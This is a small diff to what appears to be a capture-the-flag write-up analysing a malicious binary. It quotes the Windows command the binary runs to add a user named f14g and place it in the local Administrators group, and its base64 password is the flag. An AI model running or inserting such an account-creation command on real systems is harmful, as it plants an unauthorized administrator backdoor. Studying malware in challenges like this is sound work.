@@ -21,4 +21,4 @@ Downloading the mallicious binary and using strings, we can see that it executes
 cmd.exe /c net user f14g cEBzczEyMw== /ADD && net localgroup Administrators f14g /ADD
 ```
 
-It tries to add the user `f14g` to the local machine and add it to the `Administrators` group. Decode the password with base64 for the flag.
+It tries to add the user `f14g` with password `cEBzczEyMw==` to the local machine and add it to the `Administrators` group. Decode the password with base64 for the flag.
